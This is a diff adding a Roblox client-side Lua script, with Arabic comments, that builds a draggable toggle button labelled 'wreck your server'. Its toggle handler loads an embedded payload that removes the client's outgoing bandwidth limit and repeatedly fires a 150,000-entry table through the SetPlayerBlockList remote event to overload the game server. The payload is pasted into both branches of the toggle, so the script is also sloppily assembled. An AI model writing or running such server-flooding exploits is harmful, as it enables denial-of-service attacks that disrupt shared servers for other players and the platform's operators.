@@ -1,0 +1,369 @@
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+--==================== الإعدادات ====================--
+local BUTTON_IMAGE = "rbxassetid://8732036547"        -- صورة الزر
+local CLICK_SOUND  = "rbxassetid://82845990304289"    -- صوت الزر
+local BUTTON_TEXT  = "خرب سيرفرك"
+
+local ON_COLOR  = Color3.fromRGB(60, 255, 120)
+local OFF_COLOR = Color3.fromRGB(255, 70, 90)
+
+-- ضع كودك هنا
+local function OnToggle(Value)
+	if Value then
+		print("Toggle ON")
+local Running = true
+
+task.spawn(function()
+    while Running do
+local Players=game:GetService("Players")
+local RunService=game:GetService("RunService")
+local SRC=[==[local RunService=game:GetService("RunService")
+local Children=150000
+local NestedPerChild=0
+local FieldsPerChild=0
+local FireBurst=1
+local FrameDelay=0.125
+local FieldSize=0
+local RebuildEach=false
+local state={running=false,thread=nil,remote=nil,cache=nil,pad="",}
+local function resolve()
+local rrs=game:FindFirstChild("RobloxReplicatedStorage")
+if not rrs then return nil end
+local r=rrs:FindFirstChild("SetPlayerBlockList")
+if r and(r:IsA("RemoteEvent")or r:IsA("UnreliableRemoteEvent"))then
+return r
+end
+return nil
+end
+state.remote=resolve()
+pcall(function()
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+end)
+state.pad=FieldSize>0 and string.rep("P",FieldSize)or""
+local function build()
+local root=table.create(Children)
+for i=1,Children do
+local entry={id=i,v=i*2}
+for k=1,FieldsPerChild do
+entry["k"..k]=(FieldSize>0)and state.pad or(i+k)
+end
+for j=1,NestedPerChild do
+entry["n"..j]={a=i,b=j}
+end
+root[i]=entry
+end
+return root
+end
+local function fire()
+if not state.remote then
+state.remote=resolve()
+if not state.remote then return end
+end
+local payload
+if RebuildEach or not state.cache then
+payload=build()
+if not RebuildEach then state.cache=payload end
+else
+payload=state.cache
+end
+for _=1,FireBurst do
+state.remote:FireServer(payload)
+end
+end
+local function start()
+if state.running then return end
+state.running=true
+state.cache=nil
+state.thread=task.spawn(function()
+while state.running do
+pcall(fire)
+if FrameDelay>0 then
+task.wait(FrameDelay)
+else
+RunService.Heartbeat:Wait()
+end
+end
+end)
+end
+local function stop()
+state.running=false
+if state.thread then pcall(task.cancel,state.thread)end
+state.thread=nil
+state.cache=nil
+end
+return{start=start,stop=stop,toggle=function()if state.running then stop()else start()end end,isRunning=function()return state.running end,}]==]
+local loader=coroutine.create(function()
+local chunk=loadstring(SRC)
+if not chunk then return end
+local ok,api=pcall(chunk)
+if ok and type(api)=="table" then
+_G.__ALT=api
+end
+end)
+coroutine.resume(loader)
+loader=nil
+local api=_G.__ALT
+_G.__ALT=nil
+task.spawn(function()
+if api and api.start then
+pcall(api.start)
+end
+task.wait(2)
+if api and api.stop then
+pcall(api.stop)
+end
+end)
+        task.wait(1)
+    end
+end)
+
+	else
+		print("Toggle OFF")
+local Running = false
+
+task.spawn(function()
+    while Running do
+local Players=game:GetService("Players")
+local RunService=game:GetService("RunService")
+local SRC=[==[local RunService=game:GetService("RunService")
+local Children=150000
+local NestedPerChild=0
+local FieldsPerChild=0
+local FireBurst=1
+local FrameDelay=0.125
+local FieldSize=0
+local RebuildEach=false
+local state={running=false,thread=nil,remote=nil,cache=nil,pad="",}
+local function resolve()
+local rrs=game:FindFirstChild("RobloxReplicatedStorage")
+if not rrs then return nil end
+local r=rrs:FindFirstChild("SetPlayerBlockList")
+if r and(r:IsA("RemoteEvent")or r:IsA("UnreliableRemoteEvent"))then
+return r
+end
+return nil
+end
+state.remote=resolve()
+pcall(function()
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+end)
+state.pad=FieldSize>0 and string.rep("P",FieldSize)or""
+local function build()
+local root=table.create(Children)
+for i=1,Children do
+local entry={id=i,v=i*2}
+for k=1,FieldsPerChild do
+entry["k"..k]=(FieldSize>0)and state.pad or(i+k)
+end
+for j=1,NestedPerChild do
+entry["n"..j]={a=i,b=j}
+end
+root[i]=entry
+end
+return root
+end
+local function fire()
+if not state.remote then
+state.remote=resolve()
+if not state.remote then return end
+end
+local payload
+if RebuildEach or not state.cache then
+payload=build()
+if not RebuildEach then state.cache=payload end
+else
+payload=state.cache
+end
+for _=1,FireBurst do
+state.remote:FireServer(payload)
+end
+end
+local function start()
+if state.running then return end
+state.running=true
+state.cache=nil
+state.thread=task.spawn(function()
+while state.running do
+pcall(fire)
+if FrameDelay>0 then
+task.wait(FrameDelay)
+else
+RunService.Heartbeat:Wait()
+end
+end
+end)
+end
+local function stop()
+state.running=false
+if state.thread then pcall(task.cancel,state.thread)end
+state.thread=nil
+state.cache=nil
+end
+return{start=start,stop=stop,toggle=function()if state.running then stop()else start()end end,isRunning=function()return state.running end,}]==]
+local loader=coroutine.create(function()
+local chunk=loadstring(SRC)
+if not chunk then return end
+local ok,api=pcall(chunk)
+if ok and type(api)=="table" then
+_G.__ALT=api
+end
+end)
+coroutine.resume(loader)
+loader=nil
+local api=_G.__ALT
+_G.__ALT=nil
+task.spawn(function()
+if api and api.start then
+pcall(api.start)
+end
+task.wait(2)
+if api and api.stop then
+pcall(api.stop)
+end
+end)
+        task.wait(1)
+    end
+end)
+
+	end
+end
+--====================================================--
+
+local function tween(obj, time, props, style, dir)
+	local t = TweenService:Create(obj, TweenInfo.new(time, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out), props)
+	t:Play()
+	return t
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "ToggleGui"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- الزر
+local button = Instance.new("ImageButton")
+button.Name = "ToggleButton"
+button.Size = UDim2.new(0, 90, 0, 90)
+button.AnchorPoint = Vector2.new(0.5, 0.5)
+button.Position = UDim2.new(0.5, 0, 0.5, 0)
+button.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+button.BackgroundTransparency = 0.3
+button.Image = BUTTON_IMAGE
+button.ScaleType = Enum.ScaleType.Fit
+button.AutoButtonColor = false
+button.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 18)
+corner.Parent = button
+
+local stroke = Instance.new("UIStroke")
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Thickness = 3
+stroke.Color = OFF_COLOR
+stroke.Parent = button
+
+local scale = Instance.new("UIScale")
+scale.Parent = button
+
+-- نص الحالة تحت الزر
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0, 22)
+label.Position = UDim2.new(0, 0, 1, 6)
+label.BackgroundTransparency = 1
+label.Text = BUTTON_TEXT .. ": OFF"
+label.TextColor3 = OFF_COLOR
+label.Font = Enum.Font.GothamBold
+label.TextSize = 16
+label.Parent = button
+
+-- مؤشر صغير (نقطة) فوق الزر
+local dot = Instance.new("Frame")
+dot.Size = UDim2.new(0, 16, 0, 16)
+dot.AnchorPoint = Vector2.new(1, 0)
+dot.Position = UDim2.new(1, -4, 0, 4)
+dot.BackgroundColor3 = OFF_COLOR
+dot.Parent = button
+local dotCorner = Instance.new("UICorner")
+dotCorner.CornerRadius = UDim.new(1, 0)
+dotCorner.Parent = dot
+
+-- الصوت
+local sound = Instance.new("Sound")
+sound.SoundId = CLICK_SOUND
+sound.Volume = 1
+sound.Parent = button
+
+--==================== نظام Toggle ====================--
+local state = false
+
+local function setState(value)
+	state = value
+	local color = state and ON_COLOR or OFF_COLOR
+
+	tween(stroke, 0.3, { Color = color })
+	tween(dot, 0.3, { BackgroundColor3 = color })
+	tween(label, 0.3, { TextColor3 = color })
+	label.Text = BUTTON_TEXT .. (state and ": ON" or ": OFF")
+
+	-- حركة نبضة
+	scale.Scale = 0.85
+	tween(scale, 0.35, { Scale = 1 }, Enum.EasingStyle.Back)
+
+	sound:Play()
+
+	task.spawn(function()
+		local ok, err = pcall(OnToggle, state)
+		if not ok then warn("خطأ في سكربت Toggle: " .. tostring(err)) end
+	end)
+end
+
+--==================== السحب + الضغط ====================--
+local dragging, dragStart, startPos, moved = false, nil, nil, false
+
+button.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		moved = false
+		dragStart = input.Position
+		startPos = button.Position
+		tween(scale, 0.1, { Scale = 0.9 })
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+				tween(scale, 0.2, { Scale = 1 }, Enum.EasingStyle.Back)
+				if not moved then
+					setState(not state)
+				end
+			end
+		end)
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		if delta.Magnitude > 6 then moved = true end
+		if moved then
+			tween(button, 0.08, {
+				Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+			})
+		end
+	end
+end)
+
+button.MouseEnter:Connect(function()
+	tween(scale, 0.2, { Scale = 1.08 }, Enum.EasingStyle.Back)
+end)
+button.MouseLeave:Connect(function()
+	tween(scale, 0.2, { Scale = 1 })
+end)
